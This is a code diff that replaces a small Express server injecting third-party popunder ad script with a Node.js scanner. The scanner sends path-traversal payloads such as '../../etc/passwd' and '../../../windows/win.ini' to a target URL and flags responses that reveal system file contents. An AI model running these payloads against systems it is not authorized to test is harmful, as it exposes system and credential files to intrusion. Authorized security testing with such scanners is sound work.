@@ -1,33 +1,29 @@
-const express = require('express');
 const axios = require('axios');
-const app = express();
 
-app.get('/example-page', async (req, res) => {
+const targetUrl = 'http://example.com/vulnerable-endpoint';  // Replace with the target URL
+
+const payloads = [
+  '../../etc/passwd',
+  '../index.js',
+  '../../../windows/win.ini'
+];
+
+async function scan() {
+  for (const payload of payloads) {
     try {
-        const response = await axios.get('https://adbpage.com/adblock?v=3');
-
-        const htmlResponse = `
-      <html>
-        <head>
-          <title>Example Page</title>
-          ${response.data}
-        </head>
-        <body>
-          <script type="text/javascript">
-            aclib.runPop({
-              zoneId: '8558094',
-            });
-          </script>
-        </body>
-      </html>
-    `;
-
-        res.send(htmlResponse);
+      const response = await axios.get(`${targetUrl}?file=${payload}`);
+      console.log(`Payload: ${payload}`);
+      console.log(`Status: ${response.status}`);
+      if (response.data.includes('root:x:0:0:')) {
+        console.log('Possible LFI vulnerability detected!');
+      }
+      console.log('Response:', response.data);
+      console.log('-------------------------');
     } catch (error) {
-        res.status(500).send();
+      console.log(`Error with payload: ${payload}`);
+      console.error(error.message);
     }
-});
+  }
+}
 
-app.listen(9000, () => {
-    console.log('Server is running on port 9000');
-});
+scan();
